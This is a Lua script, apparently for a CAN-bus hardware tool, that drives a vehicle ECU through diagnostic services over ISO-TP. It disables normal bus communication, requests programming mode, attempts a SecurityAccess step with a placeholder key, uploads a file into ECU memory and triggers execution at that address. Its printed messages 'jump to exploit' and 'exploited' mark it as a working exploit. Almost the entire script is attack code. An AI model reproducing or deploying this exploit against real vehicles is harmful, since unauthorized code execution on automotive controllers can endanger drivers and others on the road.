local isotp = require "isotp"

SRC = 0x241
DST = 0x641

local function fromhex(str)
    return (str:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end


local lastTPsend = 0
local function sendTesterPresent()
	local now = tmr.read(1) / tmr.getclock(1)
	-- send tester present every 1 seconds
	if math.abs(now - lastTPsend) > 1 then
		can.send(0,0x101,0,fromhex("FE013E"))
		lastTPsend = now
	end

end

local function receive()
	local timeout = 100
	for i=timeout,1,-1 do
		msg = isotp.recv(SRC,DST)
		if msg and msg:byte(1) == 0x7F then
			return false
		end
		if msg and bit.band(msg:byte(1), 0x40) then
			return true
		end
		isotp.delay(1)
		sendTesterPresent()
	end
	return false
end

function setupForFlash()
	sendTesterPresent()

	isotp.delay(100)

	print("DisableNormalCommunication")
	can.send(0,0x101,0,fromhex("FE0128"))
	if receive() == false then
		print("error")
		return false
	end

	print("ReportProgrammedState")
	isotp.send(SRC,DST,fromhex("A2"))
	if receive() == false then
		print("error")
		return false
	end

	print("RequestProgramming")
	isotp.send(SRC,DST,fromhex("A501"))
	if receive() == false then
		print("error")
		return false
	end
	
	sendTesterPresent()
	isotp.delay(1000)

	print("EnableProgramming")
	isotp.send(SRC,DST,fromhex("A503"))
	
	isotp.delay(200)

	print("SecurityAccess seed")
	isotp.send(SRC,DST,fromhex("2701"))
	if receive() == false then
		print("error")
		return false
	end

	isotp.delay(200)

	print("SecurityAccess key - invalid value here")
	isotp.send(SRC,DST,fromhex("27020000"))
	if receive() == false then
		print("error")
		return false
	end

	sendTesterPresent()
	print("Ready to flash")
	return true
end

local function fsize(file)
	local current = file:seek()
	local size = file:seek("end")
	file:seek("set", current)
	return size
end 

function flashFile(name, addr)
	local f = io.open(name, "r")
	local size = fsize(f)

	print("RequestDownload " .. size)

	sendTesterPresent()
	local pkt = fromhex("3400")
	pkt = pkt .. string.char(bit.band(bit.rshift(size, 24), 0xff))
	pkt = pkt .. string.char(bit.band(bit.rshift(size, 16), 0xff))
	pkt = pkt .. string.char(bit.band(bit.rshift(size, 8), 0xff))
	pkt = pkt .. string.char(bit.band(bit.rshift(size, 0), 0xff))
	isotp.send(SRC,DST,pkt)
	local retry = false
	if receive() == false then
		print("wait")
		retry = true
	end
	if retry and receive() == false then
		print("error")
		f:close()
		return
	end

	sendTesterPresent()
	local bs = 0x100
	local retries = 10
	for i=1,size,bs do
		local data = f:read(bs)
		local pkt = fromhex("3600")
		pkt = pkt .. string.char(bit.band(bit.rshift(addr+i-1, 24), 0xff))
		pkt = pkt .. string.char(bit.band(bit.rshift(addr+i-1, 16), 0xff))
		pkt = pkt .. string.char(bit.band(bit.rshift(addr+i-1, 8), 0xff))
		pkt = pkt .. string.char(bit.band(bit.rshift(addr+i-1, 0), 0xff))
		pkt = pkt .. data
		isotp.send(SRC,DST,pkt)
		if receive() == false and retries > 0 then
			print("error")
			f:close()
			return
		end
	end
	f:close()
	
	print('done')
	print("jump to exploit")
	isotp.delay(50)
	pkt = fromhex("3680")
	pkt = pkt .. string.char(bit.band(bit.rshift(addr, 24), 0xff))
	pkt = pkt .. string.char(bit.band(bit.rshift(addr, 16), 0xff))
	pkt = pkt .. string.char(bit.band(bit.rshift(addr, 8), 0xff))
	pkt = pkt .. string.char(bit.band(bit.rshift(addr, 0), 0xff))
	isotp.send(SRC,DST,pkt)

	print("exploited")

end


function setup()
	tmr.setclock(1, 0) -- use timer 1 as slow timer for tester present
	can.setup( 0, 500000 )
	isotp.setup()
end



